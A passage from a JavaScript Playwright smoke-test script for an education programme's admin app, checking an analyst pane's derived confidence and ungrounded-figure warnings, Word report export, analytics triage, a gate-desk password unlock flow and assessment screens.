       /Granted · Paper form/.test(seededTxt) && /Prior Staff/.test(seededTxt) && /2026-06-01/.test(seededTxt));
    ok('…while the grant nobody has answered still reads as unrecorded',
       /Not recorded/.test(seededTxt));

    /* ── The Analyst pane ─────────────────────────────────────────────────
       Docked in the shell rather than parked at the bottom of the analytics
       page. Driven at the API boundary so the real pipeline runs: the scope it
       was told about, the trace built from what the plan actually did, the
       confidence derived from the claims, and — the part that matters — an
       ungrounded answer that cannot be mistaken for a checked one. */
    const anp = await browser.newPage();
    const anErrs = [];
    anp.on('pageerror', e => anErrs.push(String(e.message)));
    await anp.goto(BASE + '/tests/_boards_fixture.html?board=analyst&mode=ok', { waitUntil: 'networkidle' });
    await anp.waitForSelector('.anp', { timeout: 15000 });
    await anp.waitForTimeout(300);
    ok('the analyst pane mounts with no script error', anErrs.length === 0);
    if (anErrs.length) console.error('       ', anErrs.slice(0, 3).join(' | '));

    /* It says what it can see. An answer scoped to one centre that does not LOOK
       scoped is how a centre-level finding gets quoted as programme-wide. */
    let anTxt = await anp.evaluate(() => document.body.innerText);
    ok('the pane states the scope it was handed, rather than implying one',
      /Following this page/.test(anTxt) && /Ayobo Hub/.test(anTxt) && /Weeks 1-6/.test(anTxt));

    await anp.click('.anp-thread-hit');
    await anp.waitForSelector('.anp-ans', { timeout: 8000 });
    anTxt = await anp.evaluate(() => document.body.innerText);
    /* Steps counted from the pipeline, not decoration: plan + 2 lenses that
       answered + 1 that did not + compose + grounding check = 6. */
    ok('the trace counts the steps the pipeline actually ran', /Ran 6 steps/.test(anTxt));
    ok('…and the answer carries its claims and their corroboration',
      /Saturday sessions/.test(anTxt) && /two lenses agreed/.test(anTxt) && /one lens only/.test(anTxt));

    /* Confidence is DERIVED — from the claim confidences and the grounding
       check — never asked of the model, which would be a number about itself
       with no referent. high(1) + medium(.66) = 83%, +4 for the corroborated
       claim = 87%. */
    const conf = await anp.evaluate(() => window.anConfidence(window.__turn));
    ok('confidence is computed from the claims and says how (' + conf.pct + '%)',
      conf.pct === 87 && /corroborated/.test(conf.why));
    ok('…and the pane shows that number, not a different one', new RegExp(conf.pct + '%').test(anTxt));

    /* The one that matters. An answer whose figures are not in the evidence must
       not be able to look like one that checks out — and its confidence must
       collapse rather than be nudged. */
    const ungrounded = await anp.evaluate(() => window.anConfidence(
      Object.assign({}, window.__turn, { checks: { grounded: false, evidenceNumbers: 61, claims: [], answerUnverified: ['41%'] } })));
    ok('an ungrounded figure caps confidence at 40% instead of shading it',
      ungrounded.pct === 40 && /not in the evidence/.test(ungrounded.why));

    // Next steps are targets you can press, not suggestions inside a paragraph.
    ok('follow-ups are real targets', await anp.locator('.anp-action').count() === 2);

    /* ── The answer as data ───────────────────────────────────────────────
       Tiles, a chart and a table rather than a paragraph a reader has to take
       on trust. Rendered from what the composer returned, never parsed back out
       of the prose. */
    const blocks = await anp.evaluate(() => {
      const tiles = Array.from(document.querySelectorAll('.anp-tile')).map(e => e.innerText.replace(/\n/g, ' '));
      const svg = document.querySelector('.anp-chart svg');
      const texts = svg ? Array.from(svg.querySelectorAll('text')).map(t => t.textContent) : [];
      return { tiles, pts: svg ? svg.querySelectorAll('circle').length : 0, texts,
               caveat: (document.querySelector('.anp-caveat') || {}).textContent || '',
               dropped: (document.querySelector('.anp-dropped') || {}).textContent || '',
               chartH: (document.querySelector('.anp-chart-h') || {}).textContent || '' };
    });
    ok('the answer renders as tiles, not only as prose',
      blocks.tiles.length === 3 && /47%/.test(blocks.tiles[0]) && /down 9/.test(blocks.tiles[0]));
    /* A bare polyline in a 420px pane says nothing: no scale, no threshold, and
       no value on the point that matters. All three are cheap and all three are
       what make it readable at a glance. */
    ok('…and as a chart with a scale, the watch line and the last value called out',
      blocks.pts === 4 && blocks.texts.indexOf('watch') !== -1 && blocks.texts.indexOf('47%') !== -1
      && /-21%/.test(blocks.chartH.replace(/\s+/g, '')));
    ok('…with the condition that would make the answer wrong kept beside it',
      /one Saturday session/.test(blocks.caveat));
    /* The one that matters. A block that was produced and then dropped for
       citing a figure not in the evidence is SAID — silently omitting it is the
       honest-looking way to hide a failure, because the reader has no way to
       know a table was offered and so cannot ask why it is missing. */
    ok('a withheld block is named, with the figure that got it withheld',
      /table withheld/.test(blocks.dropped) && /412/.test(blocks.dropped));

    /* Pin → report draft → export. This is the actual workflow: nobody asks six
       questions for fun, they ask them because a paper is due. */
    await anp.click('.anp-tool:has-text("Pin")');
    await anp.waitForSelector('.anp-report', { timeout: 4000 });
    await anp.click('.anp-report');
    anTxt = await anp.evaluate(() => document.body.innerText);
    ok('a pinned answer becomes a report draft entry', /Report draft/.test(anTxt) && /Why is Ayobo falling/.test(anTxt));

    /* ── The report draft comes out as a real Word file ───────────────────
       Not an .html renamed .doc — Word opens those with a security warning and
       Google Docs refuses them outright, so the finding gets retyped, and a
       caveated finding that is retyped arrives without its caveat. Checked by
       unzipping the bytes and reading the OOXML, because "it downloaded" proves
       nothing about whether Word will open it. */
    const [docxDl] = await Promise.all([
      anp.waitForEvent('download', { timeout: 90000 }),
      anp.click('.anp-tool:has-text("Word")'),
    ]);
    const docxBytes = fs.readFileSync(await docxDl.path());
    const zipTxt = docxBytes.toString('latin1');
    ok('the report draft exports as a real .docx package',
      docxBytes[0] === 0x50 && docxBytes[1] === 0x4b
      && zipTxt.indexOf('[Content_Types].xml') !== -1
      && zipTxt.indexOf('word/document.xml') !== -1
      && docxDl.suggestedFilename().endsWith('.docx'));

    /* And the document says what the pane says. An export that drops the
       provenance is how a finding ends up in a board paper as an unattributed
       assertion. */
    const docXml = unzipDocumentXml(docxBytes);
    ok('…whose text carries the finding, its confidence and where it was drawn from',
      /Why is Ayobo falling/.test(docXml) && /retention, not teaching/.test(docXml)
      && /87% confidence/.test(docXml) && /ev-9f2a/.test(docXml) && /Weeks 1-6/.test(docXml));
    /* And the structured blocks, as a real Word table rather than a line of
       numbers. This is the point of the .docx over Markdown: the finding lands
       in the board paper laid out, instead of being retyped off a screenshot
       with the caveat left behind. */
    ok('…and the comparison arrives as a real Word table, not a line of numbers',
      /<w:tbl>/.test(docXml) && /Centres this week/.test(docXml)
      && /Ayobo Hub/.test(docXml) && /<w:tblHeader/.test(docXml));
    ok('…including the withheld-block note, so the document cannot look cleaner than the answer',
      /withheld/.test(docXml) && /one Saturday session/.test(docXml)
      && /wk1/.test(docXml) && /Lapsed/.test(docXml));

    /* The one that matters most in a document: an ungrounded answer must not be
       exportable as though it checked out. Built directly so the warning branch
       is exercised rather than hoped for. */
    const warnedB64 = await anp.evaluate(async () => {
      await window.loadVendor('docx');
      const bad = Object.assign({}, window.__turn, {
        checks: { grounded: false, evidenceNumbers: 61, claims: [], answerUnverified: ['41%'] } });
      const blob = await window.anBuildDocx(window.docx, [bad], { stamp: '2026-08-02', pinned: false, scope: '', title: 'T' });
      const buf = new Uint8Array(await blob.arrayBuffer());
      let s = ''; for (let i = 0; i < buf.length; i++) s += String.fromCharCode(buf[i]);
      return btoa(s);
    });
    const warnXml = unzipDocumentXml(Buffer.from(warnedB64, 'base64'));
    ok('an ungrounded answer exports WITH its warning, in red, above the answer',
      /were not found in the evidence/.test(warnXml) && /41%/.test(warnXml)
      && /B91C1C/.test(warnXml)
      && warnXml.indexOf('not found in the evidence') < warnXml.indexOf('retention, not teaching'));

    /* ── The report is a report, not a transcript ─────────────────────────
     * A numbered list of honest findings still leaves the reader to work out
     * what the set means and whether the set is even about the same data. The
     * synthesis and the set-level warnings go ABOVE the findings, and into the
     * document — a warning that lives only on screen arrives after the decision
     * it was meant to inform, and one that lives only in the file arrives
     * before nobody. */
    const repXml = await anp.evaluate(async () => {
      await window.loadVendor('docx');
      const t = window.__turn;
      const rep = {
        checks: {
          findings: 2, snapshots: 2, ranges: ['Weeks 1-6', 'Last 7 days'],
          mixedEvidence: true, mixedRanges: true,
          conflicts: [{ label: 'Attendance', values: [{ value: '78%' }, { value: '71%' }] }],
          ungrounded: [], unanswerable: [], droppedBlocks: 1,
          limitations: ['Only four children were graded at Ayobo.'],
          notes: [
            { level: 'warn', text: 'These 2 findings were drawn from 2 different snapshots of the data.' },
            { level: 'error', text: '1 of these findings contains a figure that was not found in the evidence.' },
          ],
        },
        synthesis: { ok: true, provider: 'stub-synth',
          summary: 'Retention is the binding constraint, not teaching quality.',
          takeaways: ['Ayobo loses children after week three.'],
          decisions: [{ do: 'Move a mentor to Ayobo.', because: 'it trails on retention' }],
          tension: 'One lens reads it as staffing, the other as travel.', dropped: [] },
      };
      const blob = await window.anBuildDocx(window.docx, [t, t], { stamp: '2026-08-02', pinned: true, scope: '', title: 'T', report: rep });
      const buf = new Uint8Array(await blob.arrayBuffer());
      let s = ''; for (let i = 0; i < buf.length; i++) s += String.fromCharCode(buf[i]);
      return btoa(s);
    }).then(b64 => unzipDocumentXml(Buffer.from(b64, 'base64')));

    ok('the document opens with what the findings add up to, not with finding one',
      /WHAT THESE FINDINGS ADD UP TO/.test(repXml)
      && /binding constraint/.test(repXml)
      && repXml.indexOf('ADD UP TO') < repXml.indexOf('Why is Ayobo falling'));
    ok('…and a genuine disagreement between findings is named, not averaged away',
      /Where the findings disagree/.test(repXml) && /staffing, the other as travel/.test(repXml));
    ok('…and what could be done comes with which finding supports it',
      /WHAT COULD BE DONE/.test(repXml) && /Move a mentor to Ayobo/.test(repXml) && /trails on retention/.test(repXml));
    /* The set-level warnings. No single finding could carry these: two findings
       from two snapshots are individually correct and collectively misleading,
       which is invisible unless it is said here. */
    /* Compared against the first finding's TEXT, not against the word
       "FINDINGS" — that word also appears in the summary heading above, so the
       obvious version of this assertion passes on the wrong occurrence. */
    ok('…the set-level warnings sit above the findings they are about',
      /READ THIS FIRST/.test(repXml) && /different snapshots/.test(repXml)
      && repXml.indexOf('READ THIS FIRST') < repXml.indexOf('Why is Ayobo falling'));
    ok('…limitations arrive as one section rather than six repetitions',
      /WHAT WOULD MAKE THIS WRONG/.test(repXml) && /four children were graded/.test(repXml)
      && repXml.indexOf('WHAT WOULD MAKE THIS WRONG') > repXml.indexOf('Why is Ayobo falling'));
    ok('…and the footer records how many snapshots and who wrote the summary',
      /2 snapshots of the data/.test(repXml) && /Weeks 1-6; Last 7 days/.test(repXml)
      && /stub-synth/.test(repXml) && /checked back against them/.test(repXml));
    // A transcript export must stay a transcript — no invented headings.
    ok('…while a report with no synthesis gains no headings it cannot fill',
      /WHAT THESE FINDINGS ADD UP TO/.test(warnXml) === false && /READ THIS FIRST/.test(warnXml) === false);

    // The composer's scope chips are the request, not a caption. Target the
    // centre by name — the chips are [range, centre] and removing the wrong one
    // would let this pass while proving nothing.
    await anp.click('.anp-chip:has-text("Ayobo Hub") button');
    await anp.fill('.anp-composer textarea', 'What changed in the second week?');
    await anp.click('.anp-send');
    await anp.waitForFunction(() => !!window.__asked, null, { timeout: 8000 });
    const asked = await anp.evaluate(() => window.__asked);
    ok('removing a scope chip genuinely drops it from the request',
      asked.question === 'What changed in the second week?' && asked.centre === '' && asked.depth === 'deep');

    // Quick depth is a real cap on the panel, not a label.
    await anp.click('.anp-cbtn.is-wide');
    await anp.waitForSelector('.anp-menu-it', { timeout: 4000 });
    await anp.click('.anp-menu-it:has-text("One lens")');
    await anp.fill('.anp-composer textarea', 'Which centre is lowest right now?');
    await anp.waitForTimeout(120);
    await anp.click('.anp-send');
    await anp.waitForTimeout(800);
    ok('Quick depth reaches the server, where it caps the panel at one lens',
      (await anp.evaluate(() => (window.__asked || {}).depth)) === 'quick');

    /* Rename and archive were reachable on the server and nowhere in the UI.
       Archive asks first — through the real dialog host, so this also proves the
       pane's confirms resolve rather than hanging. */
    await anp.click('.anp-thread-ic[title="Archive"]');
    await anp.waitForSelector('.dialog-card', { timeout: 6000 });
    await anp.click('.dialog-actions .btn-primary');
    await anp.waitForFunction(() => !!window.__archived, null, { timeout: 8000 });
    ok('a conversation can be put away from the pane it was opened in',
      (await anp.evaluate(() => window.__archived)) === 'th1');
    await anp.close();

    /* ── The analytics page ───────────────────────────────────────────────
       Redesigned around what a coordinator with forty minutes actually needs:
       triage first, the research panel promoted above the operational one, five
       headline numbers instead of nine equal tiles, and ONE centre table where
       there were two ranked lists and a comparison grid. */
    const an2 = await browser.newPage({ viewport: { width: 1400, height: 1000 } });
    const an2Errs = [];
    an2.on('pageerror', e => an2Errs.push(String(e.message)));
    await an2.goto(BASE + '/tests/_boards_fixture.html?board=analytics&mode=ok&css=1', { waitUntil: 'networkidle' });
    await an2.waitForSelector('.an-strip', { timeout: 15000 });
    await an2.waitForTimeout(300);
    ok('the analytics page mounts with no script error', an2Errs.length === 0);
    if (an2Errs.length) console.error('       ', an2Errs.slice(0, 3).join(' | '));

    /* Triage, computed rather than decorative — and capped at three, because a
       list of nine things needing attention is a list of nothing needing it. */
    const attn = await an2.evaluate(() => Array.from(document.querySelectorAll('.an-attn-c')).map(e => e.innerText));
    ok('the page opens with three things that need attention, not twenty-eight numbers',
      attn.length === 3
      && /2\b[\s\S]*logged nothing today/.test(attn[0])
      && /266[\s\S]*ungraded/.test(attn[1])
      && /below the watch line/.test(attn[2]));
    /* The watch line is 55% across the product. Ayobo (47) is under it and
       Sunshine (61) is not — a card that counted both would be using a
       different threshold from the growth model, silently. */
    ok('…and the watch-line card counts only the centres actually under 55%',
      /Ayobo Hub 47%/.test(attn[2]) && !/Sunshine/.test(attn[2]));

    ok('Level 1 is five numbers in one strip, not nine tiles in a grid',
      (await an2.locator('.an-stat').count()) === 5);

    // Research above Operations — the panel M&E opens the page for was three
    // scrolls down, under the daily-attendance chart.
    const order = await an2.evaluate(() => Array.from(document.querySelectorAll('.an-sec[id]')).map(e => e.id));
    ok('Research is promoted above Operations',
      order.indexOf('an-research') > -1 && order.indexOf('an-research') < order.indexOf('an-ops'));

    /* One table where there were three panels showing the same five centres. */
    const centres = await an2.evaluate(() => {
      const t = document.querySelector('.an-centres');
      return { rows: t.querySelectorAll('tbody tr').length,
               head: Array.from(t.querySelectorAll('thead th')).map(e => e.textContent),
               first: t.querySelector('tbody tr').innerText,
               noRanked: document.body.innerText.indexOf('Centre rankings') === -1 };
    });
    ok('one centre table replaces the two ranked lists and the comparison grid',
      centres.rows === 4 && centres.noRanked && /Egbeda/.test(centres.first));
    ok('…sorted by attendance, and carrying the evidence count a funder asks for',
      centres.head.indexOf('Evidence') !== -1 && /91%/.test(centres.first));

    /* A centre with no evidence cannot be cited in a donor report, and that has
       to look like a problem rather than like a dash. */
    const zeroEv = await an2.evaluate(() => {
      const row = Array.from(document.querySelectorAll('.an-centres tbody tr')).find(r => /Ayobo/.test(r.innerText));
      const cells = row.querySelectorAll('td');
      const c = cells[5];
      return { text: c.textContent, weight: getComputedStyle(c).fontWeight, colour: getComputedStyle(c).color };
    });
    ok('a centre with zero evidence is marked, not left as a quiet nought',
      zeroEv.text === '0' && Number(zeroEv.weight) >= 700 && /239|ef4444/i.test(zeroEv.colour));

    // Open → asks about ONE site. Without the override every row opened the same list.
    await an2.click('.an-centres tbody tr:has-text("Ayobo") .an-open');
    await an2.waitForFunction(() => !!window.__drill, null, { timeout: 6000 });
    ok('the centre table drills into that centre, not into the page filter',
      JSON.stringify(await an2.evaluate(() => window.__drill)) === '{"metric":"centre-students","centre":"Ayobo Hub"}');
    await an2.close();

    /* ── The gate desk, when somebody else is already signed in ────────────
     * The reported bug: gate links "did not work" whenever a non-admin profile
     * was signed in on the device. The server was right to refuse — a
     * guardian's or a mentor's session is not a registration desk — but the
     * page turned that recoverable refusal into "Your account doesn't have
     * staff access" plus a Retry button that could only fail again, and never
     * showed the desk password box that was the way through all along. */
    for (const [who, label] of [['nobody', 'nobody signed in'], ['member', 'a non-admin profile signed in']]) {
      const gd = await browser.newPage();
      const gdErrs = [];
      gd.on('pageerror', e => gdErrs.push(String(e.message)));
      await gd.goto(BASE + '/tests/_boards_fixture.html?board=gatedesk&mode=ok&who=' + who + '&g=GL-TEST',
        { waitUntil: 'networkidle' });
      await gd.waitForTimeout(400);
      ok('/gate mounts clean with ' + label, gdErrs.length === 0);
      if (gdErrs.length) console.error('       ', gdErrs.slice(0, 3).join(' | '));
      const gdTxt = await gd.evaluate(() => document.body.innerText);
      /* THE REGRESSION. The password box has to be on screen in BOTH cases —
         it is the only door that does not need an account. */
      const hasBox = (await gd.$$('input[type=password]')).length === 1;
      ok('/gate offers the desk password with ' + label, hasBox && /Unlock the desk/.test(gdTxt));
      ok('/gate does not dead-end on "no staff access" with ' + label,
        gdTxt.indexOf("doesn't have staff access") === -1 && gdTxt.indexOf('Gate unavailable') === -1);
      /* Everything below TYPES into that box. Bail out on its absence rather
         than letting a 30s fill() timeout abort the hundred assertions that
         come after this block — a regression here should read as a failed
         check, not as a broken harness. */
      if (!hasBox) { await gd.close(); continue; }
      if (who === 'member') {
        // Saying only "sign in" to someone already signed in reads as a broken link.
        ok('/gate names the profile that is blocking the desk',
          /Ngozi Parent/.test(gdTxt) && /can't open a registration desk/.test(gdTxt));
        ok('…and warns that the desk password signs that profile out of the device',
          /will sign Ngozi Parent out of this device/.test(gdTxt));
        /* Signing out must not navigate away from the gate — auth.signOut() goes
           to home, which throws the operator off the link they were sent. */
        await gd.evaluate(() => {
          const b = Array.from(document.querySelectorAll('button')).find(x => /Sign in as staff instead/.test(x.textContent || ''));
          if (b) b.click();
        });
        await gd.waitForFunction(() => window.__signedOut > 0, null, { timeout: 8000 });
        ok('…and signing out stays on the gate instead of bouncing to the home page',
          /Open the desk/.test(await gd.evaluate(() => document.body.innerText))
          && (await gd.evaluate(() => window.__signInOpened)) > 0);
      }

      // The password genuinely opens the desk from this state.
      await gd.fill('input[type=password]', 'nope');
      await gd.click('button:has-text("Unlock the desk")');
      await gd.waitForFunction(() => !!window.__unlockTried, null, { timeout: 8000 });
      await gd.waitForTimeout(200);
      ok('/gate reports a wrong desk password without losing the box (' + who + ')',
        /didn't match/.test(await gd.evaluate(() => document.body.innerText))
        && (await gd.$$('input[type=password]')).length === 1);
      await gd.fill('input[type=password]', 'desk-pass-9x');
      await gd.click('button:has-text("Unlock the desk")');
      await gd.waitForFunction(() => /Register/.test(document.body.innerText), null, { timeout: 8000 });
      ok('/gate opens the desk on the right password (' + who + ')',
        /THE GATE · EGBEDA DESK/.test(await gd.evaluate(() => document.body.innerText)));
      await gd.close();
    }

    /* Every relock code reaches the same door. `forbidden` was the one that did
       not, and it is the one an already-signed-in profile produces. */
    for (const code of ['forbidden', 'unauthorized', 'session_expired']) {
      const gc = await browser.newPage();
      await gc.goto(BASE + '/tests/_boards_fixture.html?board=gatedesk&mode=ok&who=member&code=' + code + '&g=GL-TEST',
        { waitUntil: 'networkidle' });
      await gc.waitForTimeout(350);
      ok('/gate treats ' + code + ' as "unlock this desk", not as a broken link',
        (await gc.$$('input[type=password]')).length === 1);
      await gc.close();
    }
    /* …and a revoked link still says so plainly rather than inviting a password
       nobody can make work. */
    const gb = await browser.newPage();
    await gb.goto(BASE + '/tests/_boards_fixture.html?board=gatedesk&mode=ok&who=member&code=gate_invalid&g=GL-TEST',
      { waitUntil: 'networkidle' });
    await gb.waitForTimeout(350);
    const gbTxt = await gb.evaluate(() => document.body.innerText);
    ok('/gate still names a revoked link as revoked, with no password box',
      /closed or revoked/.test(gbTxt) && (await gb.$$('input[type=password]')).length === 0);
    await gb.close();

    /* ── Baseline & endline ───────────────────────────────────────────────
       The screen that makes the measurement real. What it must not do is let a
       reader take the headline without the things that qualify it. */
    const as = await browser.newPage({ viewport: { width: 1280, height: 1400 } });
    const asErrs = [];
    as.on('pageerror', e => asErrs.push(String(e.message)));
    await as.goto(BASE + '/tests/_boards_fixture.html?board=assess&mode=ok&css=1', { waitUntil: 'networkidle' });
    await as.waitForSelector('.admin-tile', { timeout: 15000 });
    await as.waitForTimeout(250);
    ok('the assessment screen mounts with no script error', asErrs.length === 0);
    if (asErrs.length) console.error('       ', asErrs.slice(0, 3).join(' | '));

    const asTxt = await as.evaluate(() => document.body.innerText);
    /* The headline is the PAIRED difference, and the two cohort means sit
       beside it labelled — quoting the endline mean against the baseline mean
       is the exact mistake this feature exists to prevent, so both are on
       screen and neither can be mistaken for the other. */
    ok('the headline is the per-child gain, with its interval',
      /* "Change", not "gain": the tile also carries instruments where a fall is
         the improvement, and a heading that presumes the direction is how a
         negative number ends up read as a loss. */
      /\+8\.4/.test(asTxt) && /Mean change, per child/i.test(asTxt) && /6\.2 to 10\.6/.test(asTxt));
    ok('…beside the paired baseline AND the whole-cohort baseline, distinguished',
      /Their baseline/i.test(asTxt) && /38%/.test(asTxt) && /whole edition 41\.5%/.test(asTxt));

    /* The caveats have to be ABOVE the breakdown. A reader who has absorbed
       the split by sex will not go back and re-read the number with the
       qualification applied. */
    const asOrder = await as.evaluate(() => {
      const t = document.body.innerText;
      return { caveat: t.indexOf('not how much of the change the programme caused'),
               split: t.indexOf('By sex'),
               attrition: t.indexOf('did not return scored 5 points lower') };
    });
    ok('the no-control-group caveat is stated, and above the breakdown',
      asOrder.caveat > -1 && asOrder.split > -1 && asOrder.caveat < asOrder.split);
    ok('…as is the direction attrition cuts in',
      asOrder.attrition > -1 && asOrder.attrition < asOrder.split);

    /* A group under the floor is MARKED. Reporting a mean over two children
       beside one over thirteen, in the same column, is how a rounding artefact
       becomes a finding about girls. */
    ok('a group too small to carry a claim says so instead of showing a number',
      /too few to say/.test(asTxt) && /clear of zero/.test(asTxt));

    /* An instrument where a FALL is the win. The number is negative, the result
       is good, and a screen that colours by sign alone says the opposite of
       what the data shows. */
    ok('a lower-is-better instrument states which direction is progress',
      /LOWER score is the better result/.test(asTxt) && /-4\.5/.test(asTxt));
    const sdqColour = await as.evaluate(() => {
      const tiles = Array.from(document.querySelectorAll('.admin-tile'));
      const t = tiles.find(x => /-4\.5/.test(x.innerText));
      return t ? getComputedStyle(t.querySelector('.admin-tile-n')).color : '';
    });
    // #15803d — the same green the +8.4 gain gets, because both are improvements.
    ok('…and colours the fall as the improvement it is', /21,\s*128,\s*61/.test(sdqColour));
    ok('the provenance travels with the result, so "measured with what?" is answered',
      /Robert Goodman/.test(asTxt) && /Goodman, R\. \(1997\)/.test(asTxt));

    /* ── The catalogue ────────────────────────────────────────────────────
       The shortlist of published instruments. Its whole value is the
       provenance and the adaptation warning: an entry that shows a name and
       hides the citation is no better than "a test we wrote". */
    await as.click('.admin-tab:has-text("Catalogue")');
    await as.waitForTimeout(200);
    const catTxt = await as.evaluate(() => document.body.innerText);
    ok('the catalogue names the publisher, the licence and the citation',
      /RTI International, for USAID/.test(catTxt) && /Public good/.test(catTxt)
      && /Early Grade Reading Assessment \(EGRA\) Toolkit/.test(catTxt));
    ok('…and the local adaptation each one needs before a child sits it',
      /Before you use it:/.test(catTxt) && /levelled to the local curriculum/.test(catTxt));
    ok('a rate instrument shows its unit where a mark would show a total',
      /correct words per minute/.test(catTxt) && catTxt.indexOf('out of 200') === -1);
    ok('an instrument already in use is marked adopted, not offered again',
      /adopted/.test(catTxt));
    const adoptBtns = await as.evaluate(() =>
      Array.from(document.querySelectorAll('button')).filter(b => b.textContent.trim() === 'Adopt').length);
    // Two entries, one already adopted — so exactly one Adopt button.
    ok('…so only the un-adopted entry offers the button', adoptBtns === 1);

    await as.evaluate(() => {
      const b = Array.from(document.querySelectorAll('button')).find(x => x.textContent.trim() === 'Adopt');
      if (b) b.click();
    });
    await as.waitForFunction(() => !!window.__adopted, null, { timeout: 8000 });
    ok('adopting sends the catalogue key, not a hand-typed instrument',
      JSON.stringify(await as.evaluate(() => window.__adopted)) === '["egra.orf"]');

    // The register: a child outside the instrument's classes is flagged, not dropped.
    await as.click('.admin-tab:has-text("Instruments")');
    await as.waitForTimeout(150);
    await as.click('button:has-text("Record scores →")');
    await as.waitForSelector('input[aria-label="Score for Amina Alpha"]', { timeout: 8000 });
    const reg = await as.evaluate(() => ({
      prefilled: document.querySelector('input[aria-label="Score for Amina Alpha"]').value,
      text: document.body.innerText,
      rows: document.querySelectorAll('input[type=number]').length,
    }));
    ok('the register opens pre-filled with what is already recorded',
      reg.prefilled === '22' && reg.rows === 3);
    ok('…and flags a child the instrument was not written for rather than hiding them',
      /outside this instrument's classes/.test(reg.text) && /no class on file/.test(reg.text)
      && /Bola Beta/.test(reg.text));

    /* Absent disables the score box. Recording an absence as a zero is the
       single easiest way to turn an attendance problem into a learning
       finding, so the UI must not let the two be typed together. */
    await as.check('input[aria-label="Absent: Chidi Gamma"]');
    await as.waitForTimeout(120);
    ok('marking a child absent disables their score box — absent is not a zero',
      await as.locator('input[aria-label="Score for Chidi Gamma"]').isDisabled());

    await as.fill('input[aria-label="Score for Bola Beta"]', '31');
    await as.click('button:has-text("Save register")');
    await as.waitForFunction(() => !!window.__recorded, null, { timeout: 8000 });
    const asSent = await as.evaluate(() => window.__recorded);
    const asById = {}; asSent.results.forEach(r => { asById[r.studentId] = r; });
    ok('the whole register saves in one call, with absence sent as absence',
      asSent.windowId === 'AW-B' && asSent.results.length === 3
      && asById.S2.score === '31' && asById.S3.absent === true && asById.S1.score === '22');
    await as.close();

    /* ── The shell makes room for it ──────────────────────────────────────
       The pane is a TRACK, not an overlay, which only works if the middle
       column can shrink. Grid items default to `min-width: auto`, so a wide
       table in the middle refuses to and pushes the pane clean off the right
       edge of the window — the design calls minmax(0,1fr) load-bearing and it
       is. Measured, because reading the rule proves nothing about the cascade. */
    const shellFix = path.join(ROOT, 'tests', '_shell_fixture.html');
    fs.writeFileSync(shellFix, '<!doctype html><html><head><meta charset="utf-8">'
      + '<link rel="stylesheet" href="/dist/styles.css"><link rel="stylesheet" href="/dist/styles-app.css">'
      + '<style>body{margin:0}</style></head><body>'
      + '<div class="admin-shell has-analyst" style="--analyst-w:420px">'
      + '<aside class="admin-nav"></aside>'
      + '<main class="admin-main"><table style="width:2400px"><tr><td>very wide</td></tr></table></main>'
      + '<aside class="anp"></aside></div></body></html>');
    const sh = await browser.newPage({ viewport: { width: 1500, height: 900 } });
    await sh.goto(BASE + '/tests/_shell_fixture.html', { waitUntil: 'networkidle' });
    await sh.waitForTimeout(250);
    const box = await sh.evaluate(() => {
      const r = (s) => { const e = document.querySelector(s); const b = e.getBoundingClientRect(); return { l: b.left, r: b.right, w: b.width }; };
      return { nav: r('.admin-nav'), main: r('.admin-main'), pane: r('.anp'), vw: window.innerWidth,
               scroll: document.documentElement.scrollWidth };
    });
    await sh.close();
    try { if (!process.env.KEEP_FIX) fs.unlinkSync(shellFix); } catch (_) {}
    ok('the analyst is a third track, not an overlay — the page reflows beside it',
      Math.round(box.pane.w) === 420 && box.pane.r <= box.vw + 1 && box.main.r <= box.pane.l + 1);
    ok('…and a 2400px table shrinks the middle column instead of pushing the pane off-screen',
      box.main.w < 900 && box.scroll <= box.vw + 1);

  } catch (e) { fail++; console.error('  ✗ harness error: ' + (e && e.message)); }
  // KEEP_FIX=1 leaves tests/_boards_fixture.html on disk so a failing board can
  // be opened by hand under `php -S`. Off by default; the fixture is generated.
  finally { if (browser) await browser.close(); try { process.kill(-server.pid); } catch (_) {} try { if (!process.env.KEEP_FIX) fs.unlinkSync(FIX); } catch (_) {}
    try { fs.unlinkSync(path.join(ROOT, 'tests', '_upload_fixture.html')); } catch (_) {}  }

  console.log((fail ? '❌ FAIL' : '✅ PASS') + ': ' + pass + ' passed, ' + fail + ' failed (UI smoke: boards + card studio)');
  process.exit(fail ? 1 : 0);
})();
